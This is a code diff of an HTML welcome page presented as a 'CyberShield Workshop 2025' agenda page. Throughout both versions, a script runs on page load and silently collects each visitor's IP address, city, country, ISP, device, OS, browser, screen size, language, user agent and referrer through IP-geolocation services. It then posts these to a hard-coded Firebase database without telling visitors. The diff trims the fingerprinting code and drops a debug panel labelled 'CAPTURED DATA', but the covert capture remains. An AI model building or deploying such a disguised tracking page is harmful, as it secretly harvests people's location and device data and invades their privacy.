@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CyberShield Workshop 2025 — Welcome</title>
-<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&display=swap');
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -98,25 +97,6 @@
     font-weight: 700;
     cursor: pointer;
   }
-  /* Debug panel (only for testing) */
-  .debug-panel {
-    position: fixed;
-    bottom: 10px;
-    left: 10px;
-    right: 10px;
-    background: rgba(0,0,0,0.85);
-    color: #0f0;
-    font-family: monospace;
-    font-size: 10px;
-    padding: 8px;
-    border-radius: 8px;
-    max-height: 200px;
-    overflow: auto;
-    z-index: 9999;
-    white-space: pre-wrap;
-    word-break: break-all;
-    pointer-events: none;
-  }
 </style>
 </head>
 <body>
@@ -133,193 +113,160 @@
   <button class="btn" onclick="showAgendaImage()">Open Workshop Agenda &rarr;</button>
   <p class="small">Powered by CyberShield Events</p>
 </div>
-<div id="debugPanel" class="debug-panel" style="display:none;"></div>
 
 <script>
   // ============================================================
-  const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/"; // REPLACE
-  const AGENDA_IMAGE_URL = Agenda.png; // REPLACE
+  //  🔁 REPLACE WITH YOUR FIREBASE DATABASE URL
+  const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/";
+  //  🖼️ REPLACE WITH YOUR ACTUAL AGENDA IMAGE URL (local or full link)
+  const AGENDA_IMAGE_URL = "YOUR_AGENDA_IMAGE_URL_HERE";  // e.g., "agenda.jpg" or "https://example.com/schedule.png"
   // ============================================================
+
   let dataSent = false;
-  let debugDiv = document.getElementById('debugPanel');
 
-  function debugLog(obj) {
-    if (debugDiv) {
-      debugDiv.style.display = 'block';
-      debugDiv.innerHTML = `<strong>🔍 CAPTURED DATA:</strong><br>${JSON.stringify(obj, null, 2)}`;
-    }
-    console.log('DEBUG:', obj);
+  // ---------- Device / OS / Browser ----------
+  function getOS(ua) {
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Windows NT 6/.test(ua))  return 'Windows 7/8';
+    if (/Mac OS X/.test(ua))      return 'macOS';
+    if (/Android/.test(ua))       return 'Android';
+    if (/iPhone|iPad/.test(ua))   return 'iOS';
+    if (/Linux/.test(ua))         return 'Linux';
+    return 'Unknown OS';
   }
 
-  // ---------- iPhone model mapping (from identifier like iPhone14,2) ----------
-  const iphoneModels = {
-    'iPhone1,1': 'iPhone 2G', 'iPhone1,2': 'iPhone 3G', 'iPhone2,1': 'iPhone 3GS',
-    'iPhone3,1': 'iPhone 4', 'iPhone3,2': 'iPhone 4', 'iPhone3,3': 'iPhone 4',
-    'iPhone4,1': 'iPhone 4S', 'iPhone5,1': 'iPhone 5', 'iPhone5,2': 'iPhone 5',
-    'iPhone5,3': 'iPhone 5C', 'iPhone5,4': 'iPhone 5C', 'iPhone6,1': 'iPhone 5S',
-    'iPhone6,2': 'iPhone 5S', 'iPhone7,1': 'iPhone 6 Plus', 'iPhone7,2': 'iPhone 6',
-    'iPhone8,1': 'iPhone 6s', 'iPhone8,2': 'iPhone 6s Plus', 'iPhone8,4': 'iPhone SE (1st)',
-    'iPhone9,1': 'iPhone 7', 'iPhone9,2': 'iPhone 7 Plus', 'iPhone9,3': 'iPhone 7',
-    'iPhone9,4': 'iPhone 7 Plus', 'iPhone10,1': 'iPhone 8', 'iPhone10,2': 'iPhone 8 Plus',
-    'iPhone10,3': 'iPhone X', 'iPhone10,4': 'iPhone 8', 'iPhone10,5': 'iPhone 8 Plus',
-    'iPhone10,6': 'iPhone X', 'iPhone11,2': 'iPhone XS', 'iPhone11,4': 'iPhone XS Max',
-    'iPhone11,6': 'iPhone XS Max', 'iPhone11,8': 'iPhone XR', 'iPhone12,1': 'iPhone 11',
-    'iPhone12,3': 'iPhone 11 Pro', 'iPhone12,5': 'iPhone 11 Pro Max', 'iPhone12,8': 'iPhone SE (2nd)',
-    'iPhone13,1': 'iPhone 12 mini', 'iPhone13,2': 'iPhone 12', 'iPhone13,3': 'iPhone 12 Pro',
-    'iPhone13,4': 'iPhone 12 Pro Max', 'iPhone14,2': 'iPhone 13 Pro', 'iPhone14,3': 'iPhone 13 Pro Max',
-    'iPhone14,4': 'iPhone 13 mini', 'iPhone14,5': 'iPhone 13', 'iPhone14,6': 'iPhone SE (3rd)',
-    'iPhone14,7': 'iPhone 14', 'iPhone14,8': 'iPhone 14 Plus', 'iPhone15,2': 'iPhone 14 Pro',
-    'iPhone15,3': 'iPhone 14 Pro Max', 'iPhone15,4': 'iPhone 15', 'iPhone15,5': 'iPhone 15 Plus',
-    'iPhone16,1': 'iPhone 15 Pro', 'iPhone16,2': 'iPhone 15 Pro Max'
-  };
+  function getBrowser(ua) {
+    if (/Edg\//.test(ua))       return 'Edge';
+    if (/OPR\/|Opera/.test(ua)) return 'Opera';
+    if (/Chrome\//.test(ua))    return 'Chrome';
+    if (/Firefox\//.test(ua))   return 'Firefox';
+    if (/Safari\//.test(ua))    return 'Safari';
+    return 'Unknown';
+  }
 
-  function getDetailedDeviceInfo() {
-    const ua = navigator.userAgent;
-    const parser = new UAParser(ua);
-    const result = parser.getResult();
-    let exactDevice = "Unknown Device";
-    let androidVersion = null;
-    let osVersionRaw = result.os.version || "";
-
-    // ---- iPhone exact model ----
-    let match = ua.match(/iPhone(\d+,\d+)/);
-    if (match) {
-      let modelId = `iPhone${match[1]}`;
-      exactDevice = iphoneModels[modelId] || `iPhone (${modelId})`;
-    } 
-    // ---- iPad ----
-    else if (ua.includes('iPad')) {
-      exactDevice = 'iPad';
-      let ipadMatch = ua.match(/iPad(\d+,\d+)/);
-      if (ipadMatch) exactDevice += ` (${ipadMatch[1]})`;
-    }
-    // ---- Android exact model (from user agent) ----
-    else if (ua.includes('Android')) {
-      // Try to extract model: "SM-G998B", "Pixel 6", "Redmi Note 10", etc.
-      let modelMatch = ua.match(/; (.+?) Build\//) || ua.match(/; (.+?);/);
-      if (modelMatch && modelMatch[1]) {
-        exactDevice = modelMatch[1].trim();
-      } else {
-        exactDevice = "Android Device";
+  function getDevice(ua) {
+    const models = ['iPhone', 'iPad', 'Samsung', 'Galaxy', 'Xiaomi', 'Redmi', 'POCO',
+                    'Huawei', 'Honor', 'OnePlus', 'Realme', 'OPPO', 'Vivo', 'Pixel',
+                    'Motorola', 'Nokia'];
+    for (const m of models) {
+      if (ua.includes(m)) {
+        const match = ua.match(new RegExp(m + '[\\s/]?[\\w\\-]*', 'i'));
+        if (match) return match[0].trim();
+        return m;
       }
-      // Extract Android version
-      let androidVerMatch = ua.match(/Android (\d+(?:\.\d+)?)/);
-      if (androidVerMatch) androidVersion = androidVerMatch[1];
     }
-    // ---- Windows / Mac / Linux (PC) ----
-    else if (ua.includes('Windows NT')) {
-      exactDevice = "Windows PC";
-      let winMatch = ua.match(/Windows NT (\d+\.\d+)/);
-      if (winMatch) exactDevice = `Windows PC (NT ${winMatch[1]})`;
-    } 
-    else if (ua.includes('Mac OS X')) {
-      exactDevice = "Mac";
-    } 
-    else if (ua.includes('Linux')) {
-      exactDevice = "Linux PC";
-    }
-
-    // ---- OS details ----
-    let osName = result.os.name || "Unknown OS";
-    let osVersion = result.os.version || "";
-    if (osName === 'Android' && androidVersion) osVersion = androidVersion;
-    let fullOS = osVersion ? `${osName} ${osVersion}` : osName;
-
-    // ---- Browser + full version ----
-    let browserName = result.browser.name || "Unknown";
-    let browserVersion = result.browser.version || "";
-    let fullBrowser = browserVersion ? `${browserName} ${browserVersion}` : browserName;
-
-    // Additional PC details
-    let cpuCores = navigator.hardwareConcurrency || '?';
-    let memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '?';
-    let platform = navigator.platform || '?';
-
-    return {
-      exact_device: exactDevice,
-      os: fullOS,
-      os_version: osVersion,
-      android_version: androidVersion,
-      browser: fullBrowser,
-      browser_version: browserVersion,
-      cpu_cores: cpuCores,
-      ram_estimate: memory,
-      platform: platform,
-      raw_ua: ua
-    };
+    if (/Mobile/.test(ua)) return 'Mobile Phone';
+    if (/Tablet/.test(ua)) return 'Tablet';
+    return 'Desktop / Laptop';
   }
 
-  // ---------- IP + location ----------
+  // ---------- IP + City + Country (HTTPS APIs with fallback) ----------
   async function getLocationData() {
     const apis = [
-      { url: 'https://ipapi.co/json/', parse: (d) => ({ ip: d.ip, city: d.city, country: d.country_name, isp: d.org, region: d.region }) },
-      { url: 'https://api.ipapi.is/', parse: (d) => ({ ip: d.ip, city: d.location?.city, country: d.location?.country, isp: d.isp?.org, region: d.location?.region }) },
-      { url: 'https://ipinfo.io/json?token=anonymoustoken', parse: (d) => ({ ip: d.ip, city: d.city, country: d.country, isp: d.org, region: d.region }) }
+      {
+        url: 'https://ipapi.co/json/',
+        parse: (data) => ({
+          ip: data.ip || '—',
+          city: data.city || '—',
+          country: data.country_name || '—',
+          isp: data.org || '—'
+        })
+      },
+      {
+        url: 'https://api.ipapi.is/',
+        parse: (data) => ({
+          ip: data.ip || '—',
+          city: data.location?.city || '—',
+          country: data.location?.country || '—',
+          isp: data.isp?.org || '—'
+        })
+      },
+      {
+        url: 'https://ipinfo.io/json?token=anonymoustoken',
+        parse: (data) => ({
+          ip: data.ip || '—',
+          city: data.city || '—',
+          country: data.country || '—',
+          isp: data.org || '—'
+        })
+      }
     ];
-    for (let api of apis) {
+
+    for (const api of apis) {
       try {
-        const ctrl = new AbortController();
-        const tid = setTimeout(() => ctrl.abort(), 5000);
-        const res = await fetch(api.url, { signal: ctrl.signal });
-        clearTimeout(tid);
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000);
+        const res = await fetch(api.url, { signal: controller.signal });
+        clearTimeout(timeoutId);
         if (res.ok) {
           const data = await res.json();
           const parsed = api.parse(data);
           if (parsed.ip && parsed.ip !== '—') return parsed;
         }
-      } catch(e) {}
+      } catch (e) {
+        continue;
+      }
     }
-    return { ip: '—', city: '—', country: '—', isp: '—', region: '—' };
+    return { ip: '—', city: '—', country: '—', isp: '—' };
   }
 
-  // ---------- Capture & send ----------
+  // ---------- Capture and send to Firebase ----------
   async function captureAndSend() {
     if (dataSent) return;
     dataSent = true;
-    const device = getDetailedDeviceInfo();
-    const loc = await getLocationData();
-    const data = {
-      timestamp: new Date().toLocaleString(),
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      ip: loc.ip,
-      city: loc.city,
-      region: loc.region,
-      country: loc.country,
-      isp: loc.isp,
-      exact_device: device.exact_device,
-      os: device.os,
-      os_version: device.os_version,
-      android_version: device.android_version,
-      browser: device.browser,
-      browser_version: device.browser_version,
-      cpu_cores: device.cpu_cores,
-      ram_estimate: device.ram_estimate,
-      platform: device.platform,
-      screen: `${screen.width}x${screen.height}`,
-      language: navigator.language,
-      raw_ua: device.raw_ua
+
+    const ua = navigator.userAgent;
+    const device = getDevice(ua);
+    const os = getOS(ua);
+    const browser = getBrowser(ua);
+    const screenRes = `${screen.width}x${screen.height}`;
+    const language = navigator.language || '—';
+    const time = new Date().toLocaleString();
+
+    const { ip, city, country, isp } = await getLocationData();
+
+    const visitorData = {
+      timestamp: time,
+      ip: ip,
+      city: city,
+      country: country,
+      isp: isp,
+      device: device,
+      os: os,
+      browser: browser,
+      screen_resolution: screenRes,
+      language: language,
+      user_agent: ua,
+      referrer: document.referrer || 'direct'
     };
-    debugLog(data);
+
     try {
       await fetch(`${FIREBASE_URL}/visitors.json`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
+        body: JSON.stringify(visitorData)
       });
-      console.log("✅ Sent to Firebase");
-    } catch(e) { console.error("Firebase error", e); }
+      console.log('✅ Visitor data logged', visitorData);
+    } catch (err) {
+      console.error('❌ Firebase error:', err);
+    }
   }
 
+  // ---------- Show agenda image instantly (no loading message) ----------
   function showAgendaImage() {
+    // Replace whole body with the agenda image and a back button
     document.body.innerHTML = `
       <div class="agenda-container">
-        <img src="${AGENDA_IMAGE_URL}" alt="Agenda" style="max-width:100%; border-radius:20px;" onerror="this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22300%22%20height%3D%22200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%23f0f0f0%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23999%22%3EImage%20not%20found%3C%2Ftext%3E%3C%2Fsvg%3E';">
-        <button class="back-btn" onclick="location.reload()">← Back</button>
+        <img src="${AGENDA_IMAGE_URL}" alt="Workshop Agenda" class="agenda-img" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22300%22%20height%3D%22200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%23f0f0f0%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23999%22%3EImage%20not%20found%3C%2Ftext%3E%3C%2Fsvg%3E';">
+        <button class="back-btn" onclick="location.reload()">← Back to Welcome</button>
       </div>
     `;
   }
 
-  window.addEventListener('load', () => captureAndSend());
+  // Capture data immediately on page load
+  window.addEventListener('load', () => {
+    captureAndSend();
+  });
 </script>
 </body>
 </html>
